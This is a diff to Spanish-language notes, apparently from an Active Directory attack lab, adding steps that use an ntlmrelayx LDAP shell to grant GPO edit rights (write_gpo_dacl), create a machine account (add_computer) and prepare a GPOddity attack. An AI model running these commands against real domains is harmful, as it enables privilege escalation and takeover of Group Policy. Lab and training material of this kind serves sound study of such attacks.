@@ -299,4 +299,19 @@ La automatización ejecutara el archivo y se creara una conexión en caso de no 
 nc 127.0.0.1 11000
 ```
 
-Sobre este ususario intentamos darle permisos sobre la Politica de DevOps con distinguishedname  {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+Sobre este usuario intentamos darle permisos sobre la Política de DevOps con distinguishedname  {0BF8D01C-1F62-4BDC-958C-57140B67D147} usando
+```shell
+write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
+En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo
+```shell
+add_computer std97-gpattack Secretpass@123
+```
+
+Y ahora ya poder aprovecharnos de la politica
+```shell
+write_gpo_dacl std97-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
+Una ves tengamos la respusta necesaria con nustro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y asi poder ejecutar GPOddity
